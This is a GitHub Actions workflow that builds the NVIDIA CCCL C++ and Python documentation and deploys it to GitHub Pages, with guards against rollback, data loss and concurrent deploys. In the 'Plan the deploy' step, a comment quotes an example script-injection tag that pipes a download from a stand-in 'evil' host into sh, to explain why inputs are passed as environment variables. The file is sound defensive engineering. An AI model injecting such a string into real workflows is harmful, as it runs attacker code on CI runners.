# Usage:
#   - Pushes to main publish the development docs under docs/unstable/.
#   - Manual workflow_dispatch publishes a release:
#       gh workflow run docs-deploy.yml -f component=cpp -f source_ref=v3.5.0
#
# The version directory is derived from the source tree being published, never
# from the ref name -- see docs/release_version.py. That makes it structurally
# impossible to publish one release's documentation under another's number.
#
# Deploys are additive across versions and destructive within one: the published
# site is checked out first, the single version being rebuilt is replaced, and
# the whole tree is published back. docs/publish_site.py then makes that tree
# self-consistent -- switcher manifests, /latest/ alias, landing page, 404
# routing -- from the directories that actually exist.
name: Deploy CCCL Documentation

on:
  push:
    branches:
      - main
  # Publishing a GitHub Release publishes its documentation.
  #
  # Deliberately not `push: tags:`, which is what cuda-python uses and what
  # would look like the obvious choice: release-finalize.yml pushes the release
  # tag with github.token, and GitHub does not start workflow runs from
  # GITHUB_TOKEN pushes. A tag trigger here would never fire even once.
  #
  # The release is created as a draft and published by a person, so this fires
  # on that action. It is also the more meaningful moment: docs appear when the
  # release is announced, not when the tag lands.
  release:
    types: [published]
  workflow_dispatch:
    inputs:
      component:
        description: "Which component's docs to build"
        required: false
        default: "cpp"
        type: choice
        options:
          - cpp
          - python
          - all
      source_ref:
        description: "Ref to build from: a release tag (vX.Y.Z) or a branch. Blank builds main."
        required: false
        default: ""
        type: string
      publish_as:
        description: "Required for branch refs: the directory to publish into (unstable, or MAJOR.MINOR)."
        required: false
        default: ""
        type: string
      docs_branch:
        description: "Publish target. Use a gh-pages-* branch to rehearse without touching production."
        required: false
        default: "gh-pages"
        type: string
      allow_rollback:
        description: "Allow publishing an older patch over a newer one (deliberate rollback)."
        required: false
        default: false
        type: boolean
      allow_missing_provenance:
        description: "Allow publishing over a release directory that records no release. One-time, to establish it."
        required: false
        default: false
        type: boolean

permissions:
  contents: write
  pages: write

# Publishing is read-modify-write: the live site is checked out, one version is
# replaced, and the whole tree is written back. Two deploys running at once
# would silently lose one of them.
concurrency:
  group: docs-deploy-${{ github.event.inputs.docs_branch || 'gh-pages' }}
  cancel-in-progress: false
  # Without this the group allows at most one *pending* run, so a third trigger
  # supersedes the one waiting. Tip pushes and both release types share this
  # group, so two merges landing while a release deploy waits would discard the
  # release deploy -- and a discarded release deploy means those docs never
  # publish at all. `max` keeps up to 100 pending, processed first-in-first-out.
  queue: max

jobs:
  deploy:
    name: Build and deploy documentation
    # Routing only: don't start at all for a release of something this site
    # does not document. Whether a given release *should* be published --
    # pre-release, component, valid release tag -- is decided once, in
    # docs/deploy_plan.py, where it is covered by tests. Restating any of that
    # here would be a second copy of the policy, in the one place nothing
    # type-checks, free to drift.
    #
    # Anything that slips through fails in "Plan the deploy", which is the
    # second step and runs in seconds -- long before the 15-minute build.
    if: >-
      github.event_name != 'release' ||
      startsWith(github.event.release.tag_name, 'v') ||
      startsWith(github.event.release.tag_name, 'python-')
    runs-on: ${{ github.repository == 'NVIDIA/cccl' && 'linux-amd64-cpu32' || 'ubuntu-latest' }}
    steps:
      # The publishing tools, which must come from a ref that has them. The docs
      # themselves are built from source_ref, which may be an older release
      # whose tooling predates all of this.
      #
      # The ref is explicit because a release run's default is the *tag*, not a
      # branch -- so without this, publishing v3.4.2 would check out v3.4.2,
      # which has no deploy_plan.py, and fail on the very next step. push and
      # workflow_dispatch already resolve to a branch, and dispatch deliberately
      # uses the ref it was started on so workflow changes can be tested.
      - name: Checkout publishing tools
        uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10  # v6
        with:
          ref: >-
            ${{ github.event_name == 'release'
                && github.event.repository.default_branch
                || github.ref }}
          persist-credentials: false

      # The logic that decides what gets published, and where. In Python
      # rather than inline bash because it is the highest-consequence decision
      # here and nothing type-checks bash embedded in YAML; see the file header.
      - name: Plan the deploy
        id: inputs
        shell: bash --noprofile --norc -euo pipefail {0}
        # Every value here is attacker-influenceable to some degree -- a release
        # title or tag is chosen by whoever cuts the release, and dispatch inputs
        # by whoever can run the workflow. Interpolating ${{ }} into `run:`
        # splices the value into the script *before* bash sees it, so a tag named
        # `"; curl evil | sh; #` executes. Passing them as environment variables
        # means bash only ever sees them as data.
        # https://docs.github.com/en/actions/concepts/security/script-injections
        env:
          EVENT_NAME: ${{ github.event_name }}
          RELEASE_TAG: ${{ github.event.release.tag_name }}
          RELEASE_PRERELEASE: ${{ github.event.release.prerelease }}
          IN_COMPONENT: ${{ github.event.inputs.component }}
          IN_SOURCE_REF: ${{ github.event.inputs.source_ref }}
          IN_PUBLISH_AS: ${{ github.event.inputs.publish_as }}
          IN_DOCS_BRANCH: ${{ github.event.inputs.docs_branch }}
        run: |
          python3 docs/deploy_plan.py \
            --event "${EVENT_NAME}" \
            --release-tag "${RELEASE_TAG}" \
            --release-prerelease "${RELEASE_PRERELEASE}" \
            --component "${IN_COMPONENT}" \
            --source-ref "${IN_SOURCE_REF}" \
            --publish-as "${IN_PUBLISH_AS}" \
            --docs-branch "${IN_DOCS_BRANCH}"

      - name: Compute base URL
        id: base_url
        shell: bash --noprofile --norc -euo pipefail {0}
        run: |
          repo="${GITHUB_REPOSITORY:-${GITHUB_REPOSITORY_OWNER}/cccl}"
          owner="${GITHUB_REPOSITORY_OWNER:-${repo%%/*}}"
          repo_name="${repo#*/}"
          if [ -z "${owner}" ]; then
            owner="NVIDIA"
          fi
          if [ -z "${repo_name}" ] || [ "${repo_name}" = "${repo}" ]; then
            repo_name="cccl"
          fi
          echo "base=https://${owner}.github.io/${repo_name}/" >> "${GITHUB_OUTPUT}"

      - name: Checkout the source being documented
        uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10  # v6
        with:
          ref: ${{ steps.inputs.outputs.source_ref }}
          path: source
          # The Python component is versioned from its own python-* release
          # tags, so its history has to be there to describe against.
          fetch-depth: ${{ steps.inputs.outputs.component == 'python' && 0 || 1 }}
          persist-credentials: false

      # Read the version out of the tree rather than the ref. cuda-python does
      # the same thing, deriving it from the built artifact rather than from a
      # workflow input.
      - name: Derive the published version
        id: version
        shell: bash --noprofile --norc -euo pipefail {0}
        env:
          COMPONENT: ${{ steps.inputs.outputs.component }}
          IS_TIP: ${{ steps.inputs.outputs.is_tip }}
          EXPECT: ${{ steps.inputs.outputs.expect }}
          # Empty unless the ref really is a tag. Passing it keeps the Python
          # version from being guessed with `git describe`, which answers "some
          # reachable tag" rather than "the one being released".
          PLAN_RELEASE_TAG: ${{ steps.inputs.outputs.release_tag }}
        run: |
          # Built as an array with plain `if`s rather than `cond && args+=(...)`:
          # under `set -e` a false condition on the final line would exit the
          # step, which is a trap worth not leaving lying around.
          args=(source --component "${COMPONENT}")
          if [[ "${IS_TIP}" == "true" ]]; then
            args+=(--tip)
          fi
          if [[ -n "${EXPECT}" ]]; then
            args+=(--expect "${EXPECT}")
          fi
          if [[ -n "${PLAN_RELEASE_TAG}" ]]; then
            args+=(--release-tag "${PLAN_RELEASE_TAG}")
          fi
          python3 docs/release_version.py "${args[@]}"

      - name: Build C++ docs
        if: ${{ contains(steps.inputs.outputs.components, 'cpp') }}
        shell: bash --noprofile --norc -euo pipefail {0}
        working-directory: source
        env:
          CCCL_DOCS_BASE_URL: ${{ steps.base_url.outputs.base }}
          # Passed explicitly so that an older release's gen_docs.bash -- which
          # predates the export added for local builds -- still stamps the pages
          # with the directory they will be served from.
          SPHINX_CCCL_VER: ${{ steps.version.outputs.version_dir }}
        run: ./docs/gen_docs.bash --allow-dep-install

      # The C++ build runs the *source ref's own* gen_docs.bash and conf.py, so
      # a ref that predates the C++/Python split builds the old combined site:
      # Python pages under /<version>/python/, labelled with a C++ version they
      # never shipped under, and canonical URLs missing the version segment.
      # v3.4.2 is exactly such a ref.
      #
      # The intended route for those is a backfill branch carrying the two
      # source edits -- that is how /3.4/ was published. Nothing enforced it,
      # though, so dispatching the bare tag quietly produced the wrong site.
      # These assertions make that loud, and they are cheap enough to run on
      # every build rather than only the ones we suspect.
      - name: Check the C++ build is separated from Python
        if: ${{ contains(steps.inputs.outputs.components, 'cpp') }}
        shell: bash --noprofile --norc -euo pipefail {0}
        env:
          VERSION_DIR: ${{ steps.version.outputs.version_dir }}
          SOURCE_REF: ${{ steps.inputs.outputs.source_ref }}
        run: |
          built="source/docs/_build/html/${VERSION_DIR}"

          if [[ -d "${built}/python" ]]; then
            echo "error: the C++ build produced Python pages at ${VERSION_DIR}/python/." >&2
            echo "       ${SOURCE_REF} predates the C++/Python split: its docs/conf.py" >&2
            echo "       does not exclude docs/python and its index.rst still lists" >&2
            echo "       python/index in the toctree." >&2
            echo "" >&2
            echo "       Publish historical releases from a backfill branch that carries" >&2
            echo "       those two edits, as docs-backfill-3.4 does, rather than from the" >&2
            echo "       bare tag." >&2
            exit 1
          fi

          # The canonical link tells search engines which copy of a page is the
          # one to index. An older conf.py sets html_baseurl to the site root,
          # so every version claims the same canonical URL and the archive
          # competes with itself.
          index="${built}/index.html"
          if [[ -f "${index}" ]] && grep -q 'rel="canonical"' "${index}"; then
            # -m1 rather than `| head -1`: under `set -o pipefail`, head exiting
            # early sends grep a SIGPIPE and fails the pipeline on a *match*.
            canonical="$(grep -m1 -o 'rel="canonical" href="[^"]*"' "${index}")"
            if [[ "${canonical}" != *"/${VERSION_DIR}/"* ]]; then
              echo "error: canonical URL does not name this version: ${canonical}" >&2
              echo "       Every version would claim the same canonical URL." >&2
              echo "       This ref's docs/conf.py predates the versioned html_baseurl." >&2
              exit 1
            fi
            echo "canonical: ${canonical}"
          fi

      - name: Build Python docs
        if: ${{ contains(steps.inputs.outputs.components, 'python') }}
        shell: bash --noprofile --norc -euo pipefail {0}
        working-directory: source
        env:
          # This component is served from /python/, so its switcher manifest and
          # canonical URLs hang off that rather than off the site root.
          CCCL_DOCS_BASE_URL: ${{ steps.base_url.outputs.base }}python/
          SPHINX_CCCL_VER: ${{ steps.version.outputs.version_dir }}
          # The STF pages reference C++ labels, so this needs the C++ inventory
          # from the matching version: the tip moves with main, releases track
          # the newest published release.
          CCCL_CPP_DOCS_URL: ${{ steps.base_url.outputs.base }}${{ steps.version.outputs.version_dir == 'unstable' && 'unstable' || 'latest' }}/
        run: |
          # A release ref predates this script, so use main's copy against that
          # ref's sources -- the same reason publish_site.py is checked out
          # separately.
          cp "${GITHUB_WORKSPACE}/docs/gen_python_docs.bash" docs/
          cp -r "${GITHUB_WORKSPACE}/docs/python_conf" docs/
          ./docs/gen_python_docs.bash --allow-dep-install

      # Determined before anything can fail ambiguously. A transient checkout
      # failure must never be readable as "the site is empty", because the
      # publish below is destructive within its destination.
      - name: Check whether the docs branch exists
        id: pages
        shell: bash --noprofile --norc -euo pipefail {0}
        env:
          DOCS_BRANCH: ${{ steps.inputs.outputs.docs_branch }}
        run: |
          # This probe decides whether the archive is seeded, and the publish
          # below runs with keep_files: false. So "I could not tell" must never
          # collapse into "there is nothing there" -- that reading would delete
          # every published version.
          #
          # `git ls-remote --exit-code` exits 2, and only 2, for "no matching
          # ref". Transport, authentication, DNS and server errors surface as
          # other non-zero codes (128 in practice). The previous `if` treated
          # all of them alike and discarded the message with 2>&1 to /dev/null.
          set +e
          probe="$(git ls-remote --exit-code --heads origin "refs/heads/${DOCS_BRANCH}" 2>&1)"
          status=$?
          set -e

          case "${status}" in
            0)
              echo "exists=true" >> "${GITHUB_OUTPUT}"
              ;;
            2)
              echo "exists=false" >> "${GITHUB_OUTPUT}"
              echo "::notice::${DOCS_BRANCH} does not exist yet; this deploy creates it"
              ;;
            *)
              echo "error: could not determine whether ${DOCS_BRANCH} exists." >&2
              echo "       git ls-remote exited ${status} (2 would mean 'no such branch'):" >&2
              printf '%s\n' "${probe}" | sed 's/^/       /' >&2
              echo "" >&2
              echo "       Refusing to continue. Publishing without a seed would treat" >&2
              echo "       the site as empty and delete every archived version." >&2
              exit 1
              ;;
          esac

      # Deliberately no continue-on-error: if the branch exists and this fails,
      # the job must fail.
      - name: Seed from the published site
        if: ${{ steps.pages.outputs.exists == 'true' }}
        uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10  # v6
        with:
          ref: ${{ steps.inputs.outputs.docs_branch }}
          path: published
          fetch-depth: 1
          persist-credentials: false

      - name: Replace the versions being published
        shell: bash --noprofile --norc -euo pipefail {0}
        env:
          COMPONENT_PLAN: ${{ steps.inputs.outputs.component_plan }}
          VERSION_DIR: ${{ steps.version.outputs.version_dir }}
          RELEASE_LABEL: ${{ steps.version.outputs.release_label }}
          PAGES_EXISTS: ${{ steps.pages.outputs.exists }}
          # Non-empty only when a human deliberately asked to roll a version
          # directory back to an older patch.
          ALLOW_ROLLBACK: ${{ github.event.inputs.allow_rollback == 'true' && '1' || '' }}
          # Non-empty only when deliberately establishing provenance on a
          # directory published before it was recorded. One-time, per line.
          ALLOW_MISSING_PROVENANCE: ${{ github.event.inputs.allow_missing_provenance == 'true' && '1' || '' }}
        run: |
          # The tree that becomes gh-pages:/docs. Seeded from what is live, so
          # it is the complete desired state and can be published cleanly.
          mkdir -p _publish
          if [[ "${PAGES_EXISTS}" == "true" && -d published/docs ]]; then
            cp -a published/docs/. _publish/
          fi

          # Publishing is destructive within docs/, so confirm the seed carried
          # the live site across before anything is built on top of it. Checked
          # here rather than after assembly because assembly legitimately
          # removes directories when it retires old releases -- comparing counts
          # at the end would make routine retirement look like data loss.
          if [[ "${PAGES_EXISTS}" == "true" ]]; then
            seeded=$(find _publish -maxdepth 2 -name index.html | wc -l)
            live=$(find published/docs -maxdepth 2 -name index.html | wc -l)
            echo "seed check: live=${live} seeded=${seeded}"
            if (( seeded < live )); then
              echo "error: the seed lost content from the live site." >&2
              echo "       Refusing to continue; publishing would delete it." >&2
              exit 1
            fi
          fi

          # Where each component lives on the site comes from the plan, which
          # takes it from publish_site.COMPONENTS -- so assembly and publishing
          # cannot disagree about a component's path.
          while IFS='|' read -r component path build_subdir; do
            component_root="_publish${path:+/${path}}"
            build="source/docs/_build/${build_subdir}"
            mkdir -p "${component_root}"

            if [[ ! -d "${build}/${VERSION_DIR}" ]]; then
              echo "error: no build output at ${build}/${VERSION_DIR}" >&2
              exit 1
            fi

            # A version directory holds the newest patch in its line, and
            # nothing about scheduling guarantees that. GitHub does not promise
            # execution order within a concurrency group, and re-running an old
            # release deploy is ordinary maintenance -- so check the label that
            # is already there before overwriting it.
            existing_label=""
            if [[ -f "${component_root}/${VERSION_DIR}/.release" ]]; then
              existing_label="$(tr -d '\n' < "${component_root}/${VERSION_DIR}/.release")"
            fi
            # "Is there already something here" is a separate question from
            # "what does it say it is". A directory that exists but records no
            # release cannot be compared against, and the check must not read
            # that as permission -- see release_version.is_downgrade.
            target_exists=""
            if [[ -d "${component_root}/${VERSION_DIR}" ]]; then
              target_exists=1
            fi
            python3 "${GITHUB_WORKSPACE}/docs/release_version.py" precedence \
              --existing "${existing_label}" \
              --incoming "${RELEASE_LABEL}" \
              --directory "${component}/${VERSION_DIR}" \
              ${target_exists:+--target-exists} \
              ${ALLOW_ROLLBACK:+--allow-rollback} \
              ${ALLOW_MISSING_PROVENANCE:+--allow-missing-provenance}

            # Replace this one version wholesale. Everything else is carried
            # over by the seed, so the publish below deletes exactly the files
            # this build no longer produces -- and nothing in any other version
            # or component.
            echo "placing ${component} ${VERSION_DIR}${RELEASE_LABEL:+ (built from ${RELEASE_LABEL})}"
            rm -rf "${component_root:?}/${VERSION_DIR:?}"
            mkdir -p "${component_root}/${VERSION_DIR}"
            cp -a "${build}/${VERSION_DIR}/." "${component_root}/${VERSION_DIR}/"

            # Record which release produced this directory, inside the directory.
            # Never rendered: the switcher shows "3.4", because /cccl/3.4/ means
            # "the 3.4 line, newest patch" and naming the patch would claim the
            # URL is frozen at it. This file answers "which release built this"
            # from the site itself, years later -- the run log answers it too,
            # until it expires.
            if [[ -n "${RELEASE_LABEL}" ]]; then
              printf '%s' "${RELEASE_LABEL}" > "${component_root}/${VERSION_DIR}/.release"
            fi
          done < <(python3 -c "import json,sys;[print('|'.join([c['id'],c['path'],c['build']])) for c in json.loads(sys.argv[1])]" "${COMPONENT_PLAN}")

      - name: Assemble the site
        shell: bash --noprofile --norc -euo pipefail {0}
        run: |
          python3 docs/publish_site.py _publish \
            --base-url "${{ steps.base_url.outputs.base }}" \
            --verify

      - name: Deploy to GitHub Pages
        uses: peaceiris/actions-gh-pages@84c30a85c19949d7eee79c4ff27748b70285e453  # v4
        with:
          github_token: ${{ secrets.GITHUB_TOKEN }}
          publish_dir: ./_publish
          publish_branch: ${{ steps.inputs.outputs.docs_branch }}
          destination_dir: docs
          # _publish was seeded from the live site and is the complete desired
          # state of docs/, so cleaning is correct: it removes exactly the files
          # this build dropped. Without the seed this would destroy the archive.
          keep_files: false
          # Preserve history, so there is a prior state to roll back to.
          force_orphan: false
